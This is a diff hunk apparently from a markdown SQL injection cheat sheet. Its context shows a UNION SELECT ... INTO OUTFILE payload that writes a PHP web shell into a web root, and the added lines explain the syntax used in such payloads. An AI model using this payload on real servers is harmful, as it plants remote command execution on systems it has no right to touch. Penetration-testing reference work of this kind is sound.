@@ -91,6 +91,10 @@ After stuffing the input fields you should either obtain access to the system as
 
 ' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/<FILE>.php"--
 ```
+A couple extra things to keep in mind. `--` comments out the rest of the line. `0x7c` is just ASCII for a pipe. `+` is just url encoding for spaces.
+
+
+
 
 #### MSSQL
 
